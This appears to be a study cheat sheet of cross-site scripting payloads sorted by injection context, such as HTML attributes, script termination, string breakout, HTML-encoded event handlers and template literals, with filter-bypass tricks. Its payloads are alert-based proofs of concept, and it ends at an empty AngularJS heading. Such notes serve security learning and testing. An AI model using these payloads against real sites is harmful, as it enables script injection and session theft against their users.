## XSS in HTML tag attributes
Common XSS:
```html
"><script>alert(document.domain)</script>
```

When the angle brackets are blocked
```html
" autofocus onfocus=alert(document.domain) x="
```

In HREF attribute
```html
<a href="javascript:alert(document.domain)">
```

## XSS into JavaScript
### Terminating into JavaScript
Example
```html
<script> 
... 
var input = 'controllable data here'; 
... 
</script>
```
Payload
```html
</script><img src=1 onerror=alert(document.domain)>
```

The above payload leaves the original script broken with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.

### Breaking out of a JavaScript string
```javascript
'-alert(document.domain)-' 
';alert(document.domain)//
```

Applications ofthen make the mistake of failing to escape the backslash character itself.
```javascript
\';alert(document.domain)//
```

Sometimes we need a way to call functions which bypasses security measures. One way of doing this is to use `throw` statement with an exception handler.
```html
onerror=alert;throw 1
```

### Making use of HTML-encoding
When the XSS context is some existing JavaScript within a quoted tag attribute such as an event handler it is possible to make use of HTML-encoding to work aroung some input filters.

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```
Payload:
```javascript
&apos;-alert(document.domain)-&apos;
```

### XSS in JavaScript template literals
JavaScript template literals are string literals that allow embedded JavaScript expressions.
```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```
Payload:
```javascript
${alert(document.domain)}
```

## XSS in the context of [[AngularJS sandbox]]
